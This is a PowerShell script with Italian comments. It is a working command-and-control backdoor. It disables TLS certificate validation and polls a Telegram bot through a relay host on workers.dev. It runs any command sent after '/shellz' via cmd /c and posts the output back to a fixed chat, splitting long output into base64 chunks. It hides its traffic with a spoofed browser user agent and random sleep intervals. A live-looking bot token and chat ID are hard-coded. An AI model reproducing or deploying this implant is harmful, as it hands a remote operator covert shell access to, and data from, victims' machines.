# Bypass Certificate Check

function ssl-bypass{
add-type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
            return true;
        }
 }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
}


# CONFIG - Setting Global Variable ###########################################################################################################

$lambda  = "disagio.delaurentis.workers.dev"
$token   = '5157005211:AAHCliP0jJpJM5-RYYkso0pzbSQdMy9gIJY'
$chat_id = '176932540'
$usra    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/100.0.1185.39"    

##############################################################################################################################################


$getMeLink = "https://$lambda/bot$token/getMe"
$sendMessageLink = "https://$lambda/bot$token/sendMessage"
$forwardMessageLink = "https://$lambda/bot$token/forwardMessage"
$sendPhotoLink = "https://$lambda/bot$token/sendPhoto"
$sendAudioLink = "https://$lambda/bot$token/sendAudio"
$sendDocumentLink = "https://$lambda/bot$token/sendDocument"
$sendStickerLink = "https://$lambda/bot$token/sendSticker"
$sendVideoLink = "https://$lambda/bot$token/sendVideo"
$sendLocationLink = "https://$lambda/bot$token/sendLocation"
$sendChatActionLink = "https://$lambda/bot$token/sendChatAction"
$getUserProfilePhotosLink = "https://$lambda/bot$token/getUserProfilePhotos"
$getUpdatesLink = "https://$lambda/bot$token/getUpdates"
$setWebhookLink = "https://$lambda/bot$token/setWebhook"

ssl-bypass

$offset = 0

# Stampa Token
write-host $token

#Reset Variabili
$encodedMessage = ""
$comex= ""

while($true) {
    $json = Invoke-WebRequest -Uri $getUpdatesLink  -Body @{offset=$offset}  -UserAgent $usra | ConvertFrom-Json 
  
    Write-Host $json 
    Write-Host $json.ok 
    $l = $json.result.length 
    $i = 0 
    Write-Host $json.result 
    Write-Host $json.result.length
    while ($i -lt $l) {
          $offset = $json.result[$i].update_id + 1 
          [string]$command = $json.result[$i].message  
          if ($command -match "/shellz")
                      {
                      # Se il messaggio contiene SHELLZ attivati
                      $comex =  ([regex]'/shellz').split($json.result.message.text)
                                              
                      [string]$result = cmd /c ($comex[1]+" 2>&1");
                      $result | Format-Table                                           
                      $encodedMessage = $result #| Format-Table  #[System.Web.HttpUtility]::UrlEncode($result)
                                              
                      [array]$result2 = cmd /c ($comex[1]+" 2>&1");
                      $result2 | Format-Table
                      $encodedMessage2 = $result2 #| Format-Table  #[System.Web.HttpUtility]::UrlEncode($result)
                                              
                      if ($encodedMessage.Length -ge 4098 )
                                  {
                                  # Se l'info in uscita è maggiore di 4098 il messaggio non può essere inviato
                                  # Dividendo la Lunghezza per 4098 + 1, otteniamo il numero di messaggi minimo 
                                  # - da effettuare per trasportare l'informazione
                                  # - $n è il numero di blocchi necessari al trasportp
                                  # - $Dim_Block è la dimensione dei blocchi
                                                
                                  # Calcolo numero blocchi
                                  [int]$H= $encodedMessage.Length / 4098
                                  $n = $H + 1 ; $n
                                  # Calcolo Dimensione bloccho
                                  [int]$Dim_B= $encodedMessage.Length / $n
                                  [int]$Dim_Block = [int]$Dim_B +1 
                                                
                                  # Encoding ADSecurity.org
                                  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($encodedMessage)
                                  $EncodedText =[Convert]::ToBase64String($Bytes)
                                  
                                  # Funzione di split dei blocchi e puliziz dell'array da blocchi vuoti 
                                  $EncodedText_array = $EncodedText -Split "(.{$Dim_Block})"
                                  $array_encodedMessage = $EncodedText_array  | Where-Object {$_}
                                                
                                  # Ciclo "Send" dei blocchi
                                  foreach ($mex_encoded in  $array_encodedMessage)
                                          {
                                          $url = "https://$lambda/bot{0}" -f $token
                                          # Decoding dei blocchi
                                          $mex_Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($mex_encoded))
                                                        
                                          #Creazione Body per le POST (Evita le GET troppo lunghe)
                                          $payload = New-Object psobject
                                          $payload | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $chat_id 
                                          $payload | Add-Member -MemberType NoteProperty -Name 'text' -Value $mex_Decoded
                                          $body = $payload | ConvertTo-Json
                                                        
                                          #write-host -ForegroundColor Yellow $mex.Length
                                          Invoke-RestMethod -method Post -Uri ($url +'/sendMessage') -Body ($payload | ConvertTo-Json)  -ContentType 'application/json' -UserAgent $usra

                                          # Temporizzazione random di ritorno
                                          $time_to_sleep = 1
                                          $random_time = Get-Random -Maximum 5
                                          $effective_time = $time_to_sleep + $random_time
                                          Start-Sleep -s $effective_time
                                          }
                                  }
                                  else
                                  {
                                  $url = "https://$lambda/bot{0}" -f $token
                                  
                                  #Creazione Body per le POST (Evita le GET troppo lunghe)             
                                  $payload = New-Object psobject
                                  $payload | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $chat_id
                                  $payload | Add-Member -MemberType NoteProperty -Name 'text' -Value $encodedMessage
                                  $body = $payload | ConvertTo-Json
                                                
                                  # write-host -ForegroundColor Yellow $encodedMessage.Length
                                  Invoke-RestMethod -method Post -Uri ($url +'/sendMessage') -Body ($payload | ConvertTo-Json)  -ContentType 'application/json' -UserAgent $usra
                                  }                         
                     }
           $i++
    # Fine Parsing dei messaggi "Comando" del C2
    }

 # Temporizzazione random delle richieste di "comando"
 $time_to_sleep = 25
 $random_time = Get-Random -Maximum 10
 $effective_time = $time_to_sleep + $random_time
 Start-Sleep -s $effective_time
 

# Fine ciclo continuo
}

